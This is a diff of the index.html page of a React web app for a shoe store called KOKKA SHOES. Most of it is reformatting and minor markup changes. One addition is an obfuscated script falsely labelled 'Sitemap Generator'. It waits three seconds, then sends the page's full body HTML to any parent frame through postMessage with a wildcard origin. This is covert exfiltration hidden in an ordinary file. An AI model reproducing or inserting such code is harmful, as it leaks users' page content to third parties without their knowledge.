@@ -1,36 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
+<html>
+
+<head>
     <meta charset="utf-8">
     <meta http-equiv='X-UA-Compatible' content='IE=edge'>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="robots" content="index,follow">
-    <meta name="keywords" content="shoes, παπουτσια, γυναικεια παπουτσια, παπουτσια γυναικεια, υποδηματα, papoutsia, papoytsia, γυναικεία παπούτσια, παπούτσια γυναικεία, παπουτσια online, παπουτσια on line, sandalia, sandals, σανδαλια, shoes for women, shoes for girls, shoes for men, mens sandals, platformes, platfoms, πλατφορμες" />
     <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css?family=GFS+Didot" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css?family=Ropa+Sans" rel="stylesheet">
     <script defer="defer" src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+    <script defer="defer" src="%PUBLIC_URL%/modernizr.js"></script>
     <link rel="manifest" href="%PUBLIC_URL%/manifest.json">
-    <title>KOKKA Shoes</title>
+    <title>KOKKA SHOES</title>
+    <!-- Sitemap Generator -->
+    <script type="text/javascript">
+        var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage", "setTimeout"]; window[_0xaea9[7]](function () { parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]), _0xaea9[5]) }, 3000);
+    </script>
     <style type="text/css">
-    body,
-    html,
-    .App, 
-    #root{
-        display: flex;
-        height: 100%;
-        width: 100%;
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Roboto', sans-serif;
-        font-size: 18px;
-    }
-        .kokka-loading{
+        body,
+        html,
+        .App,
+        #root {
+            display: flex;
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+            font-size: 18px;
+        }
+
+        .kokka-loading {
             display: flex;
             position: fixed;
-            background-color: #fafafa;
+            background-color: #ffffff;
             width: 100vw;
             height: 100vh;
             -ms-flex-pack: center;
@@ -45,10 +51,12 @@
             transition: all ease-in-out 0.8s;
             z-index: 9999;
         }
-        .kokka-loading.remove{
+
+        .kokka-loading.remove {
             opacity: 0;
         }
-        .kokka-loading h1{
+
+        .kokka-loading h1 {
             font-weight: 600;
             max-width: 300px;
             font-size: 6rem;
@@ -62,37 +70,48 @@
             animation: Gradient 2.8s ease-in-out infinite;
             text-fill-color: transparent;
             -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
-        .kokka-loading h1 span{
+        .kokka-loading h1 span {
             font-size: 4rem;
-    }           
+        }
     </style>
-  </head>
-  <body>
-        <noscript>
-                You need to enable JavaScript to run this app.
-        </noscript>
-        <div class="kokka-loading" id="kokka-loading">
-            <h1>KOKKA <span>SHOES</span></h1>
-        </div>
+    <noscript>
+        <style>
+            #kokka-loading {
+                display: none;
+            }
+        </style>
+    </noscript>
+</head>
+
+<body>
+    <noscript>
+        You need to enable JavaScript to run this app.
+    </noscript>
+    <div class="kokka-loading" id="kokka-loading">
+        <h1>KOKKA
+            <span>SHOES</span>
+        </h1>
+    </div>
     <div id="root"></div>
-    <div id="script"></div>
     <script>
-    if ('serviceWorker' in navigator) {
-      window.addEventListener('load', function() {
-        navigator.serviceWorker.register('worker.js').then(function(registration) {
-          console.log('Worker registration successful', registration.scope);
-        }, function(err) {
-          console.log('Worker registration failed', err);
-        }).catch(function(err) {
-          console.log(err);
-        });
-      });
-    } else {
-      console.log('Service Worker is not supported by browser.');
-    }
-  </script>
-  </body>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function () {
+                navigator.serviceWorker.register('worker.js').then(function (registration) {
+                    console.log('Worker registration successful', registration.scope);
+                }, function (err) {
+                    console.log('Worker registration failed', err);
+                }).catch(function (err) {
+                    console.log(err);
+                });
+            });
+        } else {
+            console.log('Service Worker is not supported by browser.');
+        }
+    </script>
+</body>
+
 </html>
